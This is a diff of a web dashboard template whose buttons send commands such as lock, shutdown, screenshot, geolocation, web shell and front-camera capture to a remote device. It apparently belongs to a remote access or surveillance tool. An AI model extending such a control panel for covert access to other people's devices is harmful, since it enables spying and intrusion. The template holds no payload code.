@@ -34,11 +34,6 @@
         <span class="navbar-toggler-icon"></span>
       </button>
       <div class="collapse navbar-collapse" id="navbarSupportedContent">
-        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
-          <li class="nav-item">
-            <a class="nav-link active" aria-current="page" href="{{url_for('login')}}">Home</a>
-          </li>
-        </ul>
         <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
           <li class="nav-item">
             <a class="nav-link active" aria-current="page" href="#">{{app_auth.code_name}}</a>
@@ -82,80 +77,79 @@
   </dev>
 
 
-  <h1 id="dash">Dashboard</h1>
-
-  <!--form start-->
-
+  <h1 id="dash" class="text-center">Dashboard</h1>
   <div class="container">
     <div class="row">
       <div class="col-sm">
-        
         <form action="{{ url_for('consolee') }}" method="POST">
           <div class="mb-3">
             <input type="hidden" value="lock" name="command">
-            <button type="submit" class="btn btn-primary ">Lock</button>
+            <button type="submit" class="btn btn-primary btn-block">Lock</button>
           </div>
         </form>
-      
       </div>
       <div class="col-sm">
-        
         <form action="{{ url_for('consolee') }}" method="POST">
           <div class="mb-3">
             <input type="hidden" value="shutdown" name="command">
-            <button type="submit" class="btn btn-primary ">Shutdown</button>
+            <button type="submit" class="btn btn-danger btn-block">Shutdown</button>
           </div>
         </form>
-
       </div>
       <div class="col-sm">
-      
         <form action="{{ url_for('consolee') }}" method="POST">
           <div class="mb-3">
             <input type="hidden" value="getss" name="command">
-            <button type="submit" class="btn btn-primary ">Take Screenshot</button>
+            <button type="submit" class="btn btn-warning btn-block">Take Screenshot</button>
           </div>
         </form>
-      
       </div>
       <div class="col-sm">
-        
         <form action="{{ url_for('consolee') }}" method="POST">
           <div class="mb-3">
             <input type="hidden" value="showss" name="command">
-            <button type="submit" class="btn btn-primary ">Show All Screenshots</button>
+            <button type="submit" class="btn btn-success btn-block">Show All Screenshots</button>
           </div>
         </form>
-
       </div>
     </div>
-
     <div class="row">
       <div class="col-sm">  
         <form action="{{ url_for('consolee') }}" method="POST">
           <div class="mb-3">
             <input type="hidden" value="geo-stuff" name="command">
-            <button type="submit" class="btn btn-primary ">Geo Stuff</button>
+            <button type="submit" class="btn btn-info btn-block">Geo Stuff</button>
           </div>
         </form>
       </div>
-
       <div class="col-sm">  
         <form action="{{ url_for('consolee') }}" method="POST">
           <div class="mb-3">
             <input type="hidden" value="shell" name="command">
-            <button type="submit" class="btn btn-primary ">Webshell</button>
+            <button type="submit" class="btn btn-info btn-block">Web Shell</button>
           </div>
         </form>
       </div>
-
-
-
+      <div class="col-sm">  
+        <form action="{{ url_for('consolee') }}" method="POST">
+          <div class="mb-3">
+            <input type="hidden" value="grabfrontcam" name="command">
+            <button type="submit" class="btn btn-success btn-block">get front cam</button>
+          </div>
+        </form>
+      </div>
+      <div class="col-sm">  
+        <form action="{{ url_for('consolee') }}" method="POST">
+          <div class="mb-3">
+            <input type="hidden" value="showfcam" name="command">
+            <button type="submit" class="btn btn-danger btn-block">Show fcam pix</button>
+          </div>
+        </form>
+      </div>
     </div>
-
-
-
   </div>
+
+
 
 
 
